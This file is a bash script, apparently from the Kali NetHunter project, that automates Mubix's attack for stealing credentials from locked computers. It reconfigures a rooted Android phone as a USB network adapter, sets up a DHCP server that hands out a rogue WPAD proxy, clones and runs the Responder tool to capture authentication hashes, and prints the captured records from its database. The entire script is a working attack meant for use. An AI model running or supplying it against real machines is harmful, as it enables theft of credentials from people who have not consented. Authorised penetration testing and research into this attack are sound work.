#!/bin/bash
#
# Attack created by Mubix.  For more information see: 
# https://room362.com/post/2016/snagging-creds-from-locked-machines
# Modified for Nethunter by Binkybear
#

# ================== #
# Check for root
# ================== #
if [[ $EUID -ne 0 ]]; then
   echo "Please run this as root"
   exit
fi

# ================== #
# Let's save to root
# ================== #
cd /root

# ================== #
# Dependency checks
# ================== #
dep_check(){
DEPS=(python git python-pip python-dev screen sqlite3 python-crypto)
for i in "${DEPS[@]}"
do
  PKG_OK=$(dpkg-query -W --showformat='${Status}\n' ${i}|grep "install ok installed")
  echo "[+] Checking for installed dependency: ${i}"
  if [ "" == "$PKG_OK" ]; then
    echo "[-] Missing dependency: ${i}"
    echo "[+] Attempting to install...."
    sudo apt-get -y install ${i}
  fi
done

if [ ! -d "/root/responder" ]; then
    echo "[+] Downloading responder..."
    git clone https://github.com/lgandx/Responder
fi
}

# ================== #
# Run dependency check
# ================== #
dep_check

if [ ! -d "/root/responder" ]; then
    echo "[!] Responder not found! Exiting!"
    exit
fi

# ================== #
# Android: RNDIS setup
# ================== #
#
# TODO: Add check for RNDIS interface
#

echo "[+] Bringing down USB"

# We have to disable the usb interface before reconfiguring it
echo 0 > /sys/devices/virtual/android_usb/android0/enable
echo rndis > /sys/devices/virtual/android_usb/android0/functions
echo 224 > /sys/devices/virtual/android_usb/android0/bDeviceClass
echo 6863 > /sys/devices/virtual/android_usb/android0/idProduct
echo 1 > /sys/devices/virtual/android_usb/android0/enable

echo "[+] Check for changes"
# Check whether it has applied the changes
cat /sys/devices/virtual/android_usb/android0/functions
cat /sys/devices/virtual/android_usb/android0/enable

while ! ifconfig rndis0 > /dev/null 2>&1;do
    echo "Waiting for interface rndis0"
    sleep 1
done

echo "[+] Setting IP for rndis0"
ip addr flush dev rndis0
ip addr add 10.0.0.201/24 dev rndis0
ip link set rndis0 up

# ================== #
# Being DHCPD setup  #
# ================== #
echo "[+] Creating /root/mubix-dhcpd.conf"
cat << EOF > /root/mubix-dhcpd.conf

option domain-name "domain.local";
option domain-name-servers 10.0.0.201;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.1 10.0.0.2;
  option routers 10.0.0.201;
  option local-proxy-config "http://10.0.0.201/wpad.dat";
}
EOF

echo "[+] Remove previous dhcpd leases"
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

echo "[+] Creating SCREEN logger"
cat << EOF > /root/.screenrc
# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
EOF
mkdir -p /root/logs

# ================== #
# Let's do it live!
# ================== #
echo "[+] Starting DHCPD server in background..."
/usr/sbin/dhcpd -cf /root/mubix-dhcpd.conf

echo "[+] Wifi must be disabled.  Please disable if you have not yet."

read -p "Press enter to continue..."

echo "[+] Starting Responder on screen..."
screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I rndis0 -f -w -r -d -F'

# Get PID of Screen
export SCREEN_PID=$!

echo "Open new terminal and type screen -r"
read -p "Press enter to kill when done..."

# Loop to detect if any key is pressed
#IFS=''
#echo "[+] Press ctrl-c (volume down + c) to quit attack"
#echo ""
#echo "[+] Output of /root/responder/Responder.db:"
#if [ -t 0 ]; then stty -echo -icanon raw time 0 min 0; fi
#while [ -z "$key" ]; do
#   sqlite3 /root/responder/Responder.db 'select * from responder'
#   sleep 10
#    read key
#done
#if [ -t 0 ]; then stty sane; fi

# ================== #
# SHUT IT DOWN
# ================== #
echo "[!] Shutting Down!  Killing DHCPD, Responder, Screen"
pkill dhcpd
pkill responder
kill -9 SCREEN_PID

# Remove any leases
rm -f /var/lib/dhcp/dhcpd.leases

# Down interface!
echo 0 > /sys/class/android_usb/android0/enable
echo mtp,adb > /sys/class/android_usb/android0/functions
echo 1 > /sys/class/android_usb/android0/enable
ip addr flush dev rndis0
ip link set rndis0 down

echo "[+] Goodbye!"

# One last read
sqlite3 /root/responder/Responder.db 'select * from responder'
